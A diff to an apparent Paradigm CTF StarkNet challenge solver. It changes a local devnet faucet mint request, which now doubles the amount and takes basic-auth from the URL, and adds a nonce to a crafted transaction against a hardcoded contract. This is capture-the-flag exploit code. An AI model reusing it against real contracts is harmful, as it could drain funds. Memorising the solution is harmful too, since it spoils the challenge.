@@ -1,21 +1,24 @@
+from json import dumps
+
 from paradigmctf.cairo_challenge import *
-
-from starknet_py.net import AccountClient
-from starknet_py.contract import Contract
 from requests import post
-
+from starknet_py.contract import Contract
+from starknet_py.net import AccountClient
 from starknet_py.net.models import InvokeFunction
 
 
 async def solver(client: AccountClient, erc20_contract: Contract):
     post(
-        url=f"{client.client.net}/mint",
-        data={
-            "amount": int(0x2386F26FC10001),
-            "address": "0x7691c92a418d31d4f7edade9ae5beef41f7ea84f9a0417758bbc678239c9781",
-        },
+        url="http://127.0.0.1:5050/mint",
+        headers={"Content-Type": "application/json"},
+        data=dumps(
+            {
+                "amount": 2 * int(0x2386F26FC10001),
+                "address": "0x7691c92a418d31d4f7edade9ae5beef41f7ea84f9a0417758bbc678239c9781",
+            }
+        ),
+        auth=(client.client.net.split(sep="@")[0][7:], ""),
     )
-    print(f"{client.client.net}/mint")
 
     tx = InvokeFunction(
         version=1,
@@ -33,6 +36,7 @@ async def solver(client: AccountClient, erc20_contract: Contract):
             0,
         ],
         contract_address=0x7691C92A418D31D4F7EDADE9AE5BEEF41F7EA84F9A0417758BBC678239C9781,
+        nonce=0,
     )
     sent_tx = await client.send_transaction(tx)
     await client.wait_for_tx(sent_tx.transaction_hash)
